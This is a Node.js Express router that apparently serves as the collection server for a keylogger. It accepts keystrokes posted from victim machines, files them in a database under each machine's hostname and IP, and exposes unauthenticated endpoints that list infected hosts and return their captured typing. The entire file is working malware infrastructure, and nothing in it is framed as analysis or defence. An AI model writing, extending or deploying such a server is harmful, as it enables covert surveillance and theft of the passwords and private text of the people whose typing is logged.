const express = require('express');
const router = express.Router();

var keylog=require('./database').keylog;
var user=require('./database').user;

router.post('/', function(req, res){
    console.log(req.body);
    var host=req.body.hostname+"-"+req.body.ip;
    user.find({username:host},function(err,response){
        if(err){
            console.log("Error in checking host existance!");
        }
        //console.log(response);
        if(response.length == 0){
            var u=new user({
                username:host
            });
            u.save((e,r)=>{
                if(e){
                    console.log("Error saving host name!");
                }
                console.log("Host Name saved!..");
            });

            var k=new keylog({
                username:host,
                text:[{keys:req.body.keys}]
            });

            k.save((e,r)=>{
                if(e){
                    console.log("Error saving the key logs");
                }
                else{
                    console.log("key logs saved to db");
                }
            })
        }
        else{
            keylog.findOneAndUpdate({username:host},{$push : {text:{keys:req.body.keys}}},function(er,re){
                if(er){
                    console.log("error pushing data to host!..");
                }
                else{
                    console.log("key logs pushed to keylog collection of the host");
                }
            });
        }
    });
    //console.log(req.body);
    
    res.end();
 });
 
 router.get('/users', (req, res) => {
     //console.log(req.body);
    user.find((err,response)=>{
        if(err){
            res.send("Error fetching key loggers data");
        }
        else{
            //console.log(response);
            res.send(JSON.stringify(response));
        }   
    })
});

router.get('/user/logs/:host', (req, res) => {
    console.log(req.params);
   keylog.find({username:req.params.host},(err,response)=>{
       if(err){
           res.send("Error fetching key loggers data");
       }
       else{
           //console.log(response);
           res.send(JSON.stringify(response));
       }   
   })
});

module.exports=router;